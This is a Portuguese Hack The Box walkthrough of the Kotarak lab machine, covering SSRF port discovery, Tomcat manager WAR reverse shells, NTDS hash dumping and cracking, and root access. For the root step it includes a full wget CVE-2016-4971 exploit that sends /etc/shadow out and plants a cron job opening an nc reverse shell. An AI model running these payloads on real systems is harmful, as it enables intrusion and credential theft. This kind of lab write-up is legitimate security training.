---
title: "Hack The Box - Kotarak"
tags: [Linux,Hard,Wfuzz,BurpSuite,Web,Gobuster,Metasploit,Impacket]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/101>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

Nmap normal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_nmap.png)

Nmap Full Ports

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> --max-retries 0 --> pra ir mais rápido

### Verificamos que temos 4 portas abertas no servidor

> Portas 22, 8009 e 8080 - Servidor Web

> Porta 60000 - Não sei

## Enumeração da Porta 60000

Bom, por ser uma porta estranha, vamos rodar outro nmap apenas nela, enumerando mais a fundo, com a flag `-A` de aggressive

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_nmap2.png)

Bom, pela saida do nmap me pareceu ser muito uma porta web, então acessamos pelo navegador pra ver melhor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_web.png)

Realmente é web, bom vamos ver o que podemos extrair de interessante nela, tentamos fazer uma requisição qualquer nesse campo que aparece no site, por falar que faz navegação anônima, o teste mais simples que podemos fazer é tentar tocar na porta 80

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_web1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_web2.png)

Opa! Ele consegue chegar na minha máquina Kali, isso já é interessante. Que tal tentarmos um file inclusion? Com um simples `file:///etc/passwd`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_web3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_web4.png)

É, por ai não deu muito certo, vamos prosseguir na enumeração dessa porta

### Descobrindo portas pela porta 60000

Bom, já que fazemos requisições para servidores web, que tal fazermos pra a máquina mesmo, a localhost, sim, isso mesmo. Vamos mandar a requisição para o BurpSuite para trabalhar melhor, e com isso ver se conseguimos extrair algo de útil para nossa exploração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp1.png)

Agora para o Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp2.png)

Tesntamos um localhost:60000

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp3.png)

Sim, é possível! Pois ele retornou a página web da porta 60000

#### Fuzzing 1º Modo - wfuzz

O primeiro modo de fazermos isso é através do wfuzz

`wfuzz -c --hl=2 -z range,1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_wfuzz.png)

Verificamos que a porta 888 chamou atenção, é muito maior que as outras

#### Fuzzing 2º Modo - BurpSuite

Também podemos fazer, claro, através do nosso amigo BurpSuite, eu pessoalmente prefiro no wfuzz, mas é interessante conhecer os dois modos

Mandamos pro Intruder e arrumamos, pro payload ser somente a porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp5.png)

Setamos para ser uma sequencia de números e damos RUN

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp6.png)

Isso demora pra caramba, mas podemos verificar que a response da porta 888 é maior do que as outras

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp7.png)

## Conseguindo Credenciais

Bom, agora acessamos essa porta que descobrimos que temos acesso no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_web5.png)

Bom, pelo visto temos algo em backup, uma vez que ele tem tamanho, mas se clicamos nele não da certo, vamos mandar pro burp, pra brincar um pouco com ele pra ver se extraimos algo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp8.png)

Mandamos pro Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp9.png)

Primeira coisa que verificamos, sutilmente, é que houveram mudanças na URL

`GET /url.php?doc=backup HTTP/1.1`

O 'certo' seria ser assim, pois como é feita as requsições dentro desse servidor ai

`GET /url.php?path=http://127.0.0.1:888/?doc=backup HTTP/1.1`

E conseguimos acessar ele!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_burp10.png)

Conseguimos uma senha!

`<user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>`

admin:3@g01PdhB!

Muito bom! Agora temos uma credencial para ser utilizada em algum lugar no site

## Enumeração porta 8080

Bom, já que essa outra porta já finalizou na enumeração vamos partir pra 8080

Verificamos que é um apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_w.png)

Rodamos o gobuster nele

`gobuster dir -u http://10.10.10.55:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_gobuster.png)

Bom, a partir de outras máquinas eu sei que o painel de administração do tomcat fica em `/manager/html` então acesso ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_w1.png)

Opa, um campo de login e senha, e já temos login e senha! Acessamos o painel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/Z_w2.png)

Bom, sabendo como funciona a exploração de Tomcat, já fizemos em outras várias máquinas como por exemplo a `Jerry - HTB`, a ideia da exploração é a mesma, vamos fazer de dois modos, um manual e um automatizado pelo metasploit framework

# Explorando Apache Tomcat

## 1º Modo - Explorando através do Metasploit Framework

Procuramos por exploits para tomcat no Metasploit Framework

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jerry/Jerry_msf.png)

Utilizamos ele `use exploit/multi/http/tomcat_mgr_upload`

Colocamos as configurações

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_msf.png)

Executamos e ganhamos uma shell na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_msf1.png)

## 2º Modo - Explorando através de script automatizado (Fail)

Agora vamos fazer isso de maneira automatizada sem usar o metasploit framework

> https://github.com/mgeeky/tomcatWarDeployer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_aut.png)

Passamos pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_aut1.png)

Agora executamos (lembrar de colocar exatamente a página que vai pedir o login e senha do tomcat)

`python tomcatWarDeployer.py -U admin -P 3@g01PdhB! -H 10.10.16.126 -p 443 http://10.10.10.55:8080/manager/html`

Não temos shell, não sei pq, tem que debugar o exploit pra descobrir, mas o que importa nesse momento é a utilização da ferramenta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_aut2.png)

## 3º Modo - Explorando manualmente

O último modo que vou demonstrar é o melhor para entender como ocorre essa exploração, vamos gerar um payload com o msfvenom e upar ele no site, e após isso executar e ganhar uma shell

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.126 LPORT=443 -f war > tomcat.war`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_war.png)

Agora upamos ele no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_war1.png)

Executamos e ganhamos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_war2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_war3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_war4.png)

Bom, os três modos querem dizer a mesma coisa, eles fazem a coisa praticamente, fizemos todos eles pra treinar

# Escalando Privilégio - Tomcat -> Atanas

Uma vez na máquina, vamos pesquisar por arquivos de interesse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at.png)

Verificamos do que se trata esses dois arquivos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at1.png)

Interessante, arquivos de senhas do Windows

Nota

`Arquivo NTDS -> Tem praticamente tudo do AD, senhas, hashs e tudo mais`

`MS Windows Registry File -> Não preciso nem falar, são arquivos do registro do windows que possui senhas`

Vamos passar esses dois arquivos para nossa máquina pra melhor trabalharmos com eles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at3.png)

## Extraindo senhas com o impacket

Bom, sabendo que temos um arquivo de senhas windows, possivelmente de um sistema windows, devemos procurar por ferramentas que fazem extração de senhas em arquivos de registro e sistema do windows

O `impacket` faz isso, uma de suas ferramentas é o `secrestsdump`

`impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at4.png)

Interessante, apareceu que nessa máquina windows que foi extraido esse arquivo temos o usuário `atanas` e também temos ele na nossa linux

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at5.png)

Aqui estão todos os hashs, vamos dar uma filtrada neles e pesquisar pra ver se conseguimos quebrar alguns deles

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: 
```

Filtramos eles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at6.png)

Encontramos três senhas online

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at7.png)

```
2b576acbe6bcfda7294d6bd18041b8fe:Password123!
31d6cfe0d16ae931b73c59d7e0c089c0:$HEX[0005170001c084]
e64fe0f24ba2489c05e64354d74ebd11:f16tomcat!
```

Verificamos que é a senha do `Administrador` e do `atanas`, mas não temos administrador na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at8.png)

Vamos testar as duas senhas no usuário atanas, a senha que deu certo é a senha do administrador (f16tomcat!)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_at9.png)

Bom, agora vamos iniciar a escalação de privilégio para root

# Escalando Privilégio - Atanas -> Root

Primeira coisa que percebemos ao entrar na máquina, é que temos acesso a pasta do /root, e dentro dela temos dois arquivos, um `app.log` e um `flag.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_priv.png)

O que chamou atenção é o log do `wget`, não ta ali a toa, deve ter alguma coisa pra ser feita com ele

Pesquisando por `Wget/1.16 (linux-gnu)` descobirmos que há uma vulnerabilidade nele que podemos escalar privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_priv1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_priv2.png)

Copiamos para nossa pasta de trabalho esse exploit, pra ver como podemos explorar essa vulnerabilidade, uma vez que a versão bate e temos o wget na máquina Kotarak instalado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_priv3.png)

## Explorando Wget 1.16

Bom, após ler como o exploit funciona, vamos realizar essa exploração

1º Passo - Criação do arquivo `.wgetrc`

```
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_r.png)

2º Passo - Fazemos as alterações no `exploit.py` que está dentro da PoC disponibilizada no searchploit

```
#!/usr/bin/env python

#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971 
#

import SimpleHTTPServer
import SocketServer
import socket;

class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc

       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

       print "Sending back a cronjob script as a thank-you for the file..." 
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)

       print "\nEspera um minutinho que voce vai ganhar o shell :) \n"

       return

HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.10.55'
FTP_PORT = 21

ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.126 8888 >/tmp/f \n"

handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print "Ready? Is your FTP server running?"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)

print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

handler.serve_forever()
```

O que foi mudado?

```
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.10.55'
FTP_PORT = 21
```

E, logicamente o ROOT_CRON

`ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.126 8888 >/tmp/f \n"`

3º Passo - Agora iremos abrir um servidor FTP na porta 21 que irá disponbilizar o arquivo `.wgetrc`

Que porra é essa de `authbind`? Ele serve para executarmos comandos em portas baixas, que por padrão somente o root pode executar, é uma carta na manga!

`authbind python -m pyftpdlib -p21 -w`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_r1.png)

4º Passo - Execução do exploit

Bom, agora é só executar o exploit

`authbind python wget_exploit.py`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_r2.png)

Esperamos e conseguimos o shell, isso demora um bocado pois até o servidor processar todo a comunicação, modificar a executar a cron, leva um certo tempo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_r3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_r4.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-kotarak/K_user.png)